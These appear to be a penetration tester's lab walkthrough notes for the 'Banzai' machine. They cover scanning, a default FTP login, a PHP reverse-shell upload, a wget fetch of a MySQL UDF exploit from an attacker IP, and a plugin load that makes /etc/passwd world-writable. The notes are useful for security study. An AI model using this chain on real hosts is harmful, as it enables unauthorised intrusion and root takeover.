# Banzai
# date 7/8/2023
# ip 192.168.239.56

# nmap
```
PORT     STATE  SERVICE    VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp        vsftpd 3.0.3
22/tcp   open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
25/tcp   open   smtp       Postfix smtpd
5432/tcp open   postgresql PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.19
8080/tcp open   http       Apache httpd 2.4.25
8295/tcp open  http    Apache httpd 2.4.25 ((Debian))
```
# gobuster
```
we found img web where pall img are stored
/css                  (Status: 301) [Size: 321] [--> http://192.168.239.56:8295/css/]
/lib                  (Status: 301) [Size: 321] [--> http://192.168.239.56:8295/lib/]
/img                  (Status: 301) [Size: 321] [--> http://192.168.239.56:8295/img/]
/js                   (Status: 301) [Size: 320] [--> http://192.168.239.56:8295/js/]
/contactform          (Status: 301) [Size: 329] [--> http://192.168.239.56:8295/contactform/]
```

# ftp
```
default pass can be bruteforce
admin:admin

ftp> cd img

here are imges stored for website


```
# exploitaion
```
└─$ nc -lvnp 22(only on 22)                          
ftp> put php-reverse-shell.php   (in img folder)

http://192.168.239.56:8295/img/php-reverse-shell.php 

```
# priv esc
```
db conf found in /var/www/
got creds for mysql
$ cat config.php
define('DBUSER', 'root');
define('DBPASS', 'EscalateRaftHubris123');


$ mysql -u root -p


mysql> status;
status;
mysql  Ver 14.14 Distrib 5.7.30, for Linux (x86_64) using  EditLine wrapper


the mysql version is outdated

└─$ searchsploit -m 1518.c


 * $ gcc -g -c 1518.c -o raptor_udf2.o
gcc -g -c 1518.c -o raptor_udf2.o
 * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

wget http://192.168.45.206:22/1518.c


put exploit at /usr/lib/mysql/plugin/raptor_udf2.so:

use mysql;
create table foo(line blob);

insert into foo values(load_file('/dev/shm/raptor_udf2.so'));
insert into foo values(load_file('/var/www/html/raptor_udf2.so'));

select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
select * from mysql.func;
select do_system('chmod 777 /etc/passwd');


1
2
3
4
5
6
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';


select * from mysql.func;
select do_system('chmod 777 /etc/passwd');
```



gcc -g -c 1518.c 
